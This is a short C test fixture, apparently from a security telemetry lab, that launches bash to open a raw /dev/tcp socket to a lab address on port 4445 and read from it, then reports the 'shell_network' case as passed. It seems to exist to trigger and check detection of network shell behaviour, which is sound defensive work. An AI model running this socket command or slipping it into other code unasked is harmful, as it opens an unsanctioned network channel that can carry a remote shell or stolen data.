#include "../common.h"
#include "../utility.h"
int main(int argc, char **argv) {
 if (!fixture_begin(argc,argv,"shell_network")) return 0;
const char *args[] = {"/bin/bash", "-c", "exec 3<>/dev/tcp/198.18.0.1/4445; cat <&3", NULL};
launch_verified(args, "telemetry-lab-fixture\n", 0, NULL, NULL);
printf("CASE_OK shell_network\n");
return 0;
}
